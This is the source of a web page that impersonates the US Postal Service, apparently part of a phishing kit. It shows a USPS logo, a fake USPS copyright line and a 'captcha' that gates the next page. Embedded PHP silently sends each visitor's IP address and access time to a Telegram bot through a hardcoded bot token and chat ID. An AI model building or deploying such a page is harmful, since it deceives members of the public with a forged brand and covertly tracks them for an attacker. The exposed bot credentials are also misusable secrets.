<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USPS Captcha</title>
  <style>
    body {
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: whitesmoke; /* Red background color */
      font-family: Arial, sans-serif;
      color: #fff; /* White text color */
    }

    #loader-container {
      position: absolute;
      top: 5%;
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
    }

    .custom-loader {
      width: 100px;
      height: 10px;
      background-color: #fff; /* White background color for the loader */
      position: relative;
    }

    .loader-bar {
      width: 20px;
      height: 100%;
      background-color: #ff4500; /* Orange color for the loader */
      position: absolute;
      animation: move 2s infinite linear;
    }

    @keyframes move {
      0%, 100% {
        transform: translateX(0);
      }
      50% {
        transform: translateX(80px);
      }
    }

    #loader-text {
      margin-top: 10px;
      font-size: 18px;
      color: black;
    }

    #main-page-content {
      flex-direction: column;
      align-items: center;
    }

    #main-page-button {
      margin-top: 20px;
      padding: 15px 30px; /* Increased padding */
      background-color: #fff; /* White background color for the button */
      color: black; /* Red text color for the button */
      border: none;
	  padding-left:5rem;
	   padding-right:5rem;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold; /* Bold font */
    }

    #input-section {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input {
      margin-top: 10px;
      padding-left: 15px;
	  padding-right:15px;
	  padding:10px;
      border: 1px solid #fff; /* White border for the input field */
      border-radius: 5px;
      color: #333; /* Text color for the input field */
    }
	   /* Style for incorrect input */
    #userInput.invalid {
      border: 2px solid darkblue;
    }

    #errorMsg {
      color: color !important;
	  font-size:0.8rem;
    }
  </style>
</head>
<body>
  <?php
$botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
$chatID = "1064643518";

// Capturing the Visitor's IP Address
$userIP = $_SERVER['REMOTE_ADDR']; 
$accessTime = date("Y-m-d H:i:s");

// Message to Send
$message = urlencode("Accessed on: $accessTime, IP: $userIP");

// Telegram API URL for sending messages
$telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

// Use file_get_contents to send the request
$response = file_get_contents($telegramApi);

?>


<div id="loader-container">
  <br>
  <img src="https://i0.wp.com/mailomg.com/wp-content/uploads/2017/09/usps_eagle-symbol.png?resize=300%2C253&ssl=1">
    <div id="loader-text">Please finish the captcha to go to the main page...</div>

<br>
</div>
<br>
<br>

<br>


<div id="main-page-content">
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
    <rect width="100%" height="100%" fill="#eee" />
    <text id="randomStringSpan" x="50%" y="50%" font-size="30" fill="#333" text-anchor="middle" dominant-baseline="middle" font-family="Arial, sans-serif">
  

    </text>
    <line x1="10" y1="40" x2="190" y2="40" stroke="#333" stroke-width="2" />
    <line x1="10" y1="60" x2="190" y2="60" stroke="#333" stroke-width="2" />
    <line x1="30" y1="20" x2="30" y2="80" stroke="#333" stroke-width="2" />
    <line x1="70" y1="20" x2="70" y2="80" stroke="#333" stroke-width="2" />
    <line x1="110" y1="20" x2="110" y2="80" stroke="#333" stroke-width="2" />
    <line x1="150" y1="20" x2="150" y2="80" stroke="#333" stroke-width="2" />
    <circle cx="25" cy="25" r="5" fill="#333" />
    <circle cx="50" cy="75" r="5" fill="#333" />
    <circle cx="100" cy="40" r="5" fill="#333" />
    <circle cx="150" cy="60" r="5" fill="#333" />
  </svg>

  <div id="input-section">
    <input  id="userInput"  type="text" placeholder="Enter captcha text" />
			<span id="errorMsg"></span>
    <button id="main-page-button" onclick="checkInput()" style="color:red">Submit</button>

  </div>
</div>
<div style="position:absolute;display:block;bottom:0px" >
<p style="color:black; text-align: center;"> Copyright © 2024 USPS, Inc. </p>
</div>
<script src="script.js"></script>

</body>
</html>
